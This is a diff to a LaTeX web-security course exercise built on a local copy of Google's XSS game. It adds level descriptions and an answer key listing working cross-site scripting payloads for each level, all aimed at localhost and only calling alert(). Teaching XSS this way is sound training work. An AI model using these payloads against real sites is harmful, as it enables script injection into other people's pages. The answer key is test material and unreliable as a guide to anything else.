@@ -2,7 +2,7 @@
 \begin{Exercise}[label={websec-xss-game}]
 	The final exercise is game developed by google to teach developers the basics of XSS. The game can be found at https://xss-game.appspot.com/. Since all this course is based on node, and the back-end of the original game is developed in python, we've made our own version. 
 	
-	The game has 6 levels, and each of them explore a diferent type of exploit.
+	The game has 6 levels, and each of them explore a diferent type of exploit. Beware that there are several ways to beat each level, and the final objective is to trigger an alert function.
 	
 	\subsubsection{Level 1}
 	\paragraph{Mission Description}
@@ -13,22 +13,61 @@
 	Inject a script to pop up a JavaScript alert() in the frame below. 
 
 	\subsubsection{Level 2}
+		\paragraph{Mission Description}
+		Web applications often keep user data in server-side and, increasingly, client-side databases and later display it to users. No matter where such user-controlled data comes from, it should be handled carefully. 
+		
+		This level shows how easily XSS bugs can be introduced in complex apps.
+		\paragraph{Mission Objective}
+		Inject a script to pop up an alert() in the context of the application. 
+	
 	\subsubsection{Level 3}
+		\paragraph{Mission Description}
+		As you've seen in the previous level, some common JS functions are execution sinks which means that they will cause the browser to execute any scripts that appear in their input. Sometimes this fact is hidden by higher-level APIs which use one of these functions under the hood. 
+		
+		The application on this level is using one such hidden sink.
+	
+		\paragraph{Mission Objective}
+		As before, inject a script to pop up a JavaScript alert() in the app. 
+		
+		Since you can't enter your payload anywhere in the application, you will have to manually edit the address in the URL bar below.
+	
 	\subsubsection{Level 4}
+		\paragraph{Mission Description}
+		Every bit of user-supplied data must be correctly escaped for the context of the page in which it will appear. This level shows why.
+	
+		\paragraph{Mission Objective}
+		Inject a script to pop up a JavaScript alert() in the application.
+	
 	\subsubsection{Level 5}
+		\paragraph{Mission Description}
+		Cross-site scripting isn't just about correctly escaping data. Sometimes, attackers can do bad things even without injecting new elements into the DOM.
+	
+		\paragraph{Mission Objective}
+		Inject a script to pop up an alert() in the context of the application.
+	
 	\subsubsection{Level 6}
+		\paragraph{Mission Description}
+		Complex web applications sometimes have the capability to dynamically load JavaScript libraries based on the value of their URL parameters or part of location.hash. 
+		
+		This is very tricky to get right -- allowing user input to influence the URL when loading scripts or other potentially dangerous types of data such as XMLHttpRequest often leads to serious vulnerabilities.
+		
+	
+		\paragraph{Mission Objective}
+		Find a way to make the application request an external file which will cause it to execute an alert(). 
+		
 	
 \end{Exercise}
 \begin{Answer}[ref={websec-xss-game}]
 	\subsubsection{Level 1}
-	<script>alert()</script>
+	\verb|<script>alert()</script>|
 	\subsubsection{Level 2}
-	<img src='stuff' onerror='alert()'>
+	\verb|<img src='stuff' onerror='alert()'>|
 	\subsubsection{Level 3}
-	%https://localhost:8000/#1.jpg'onload='alert("xss")'
+	\verb|https://localhost:8000/#1.jpg'onload='alert("xss")'|
 	\subsubsection{Level 4}
-	?timer=')%3Balert(1)%3Bvar b=('
+	\verb|?timer=')%3Balert(1)%3Bvar b=('|
 	\subsubsection{Level 5}
-	%http://localhost:8000/signup?next=javascript:alert(1)
+	\verb|http://localhost:8000/signup?next=javascript:alert(1)|
 	\subsubsection{Level 6}
+	\verb|http://localhost:8000/#data:text/plain,alert('xss')|
 \end{Answer}
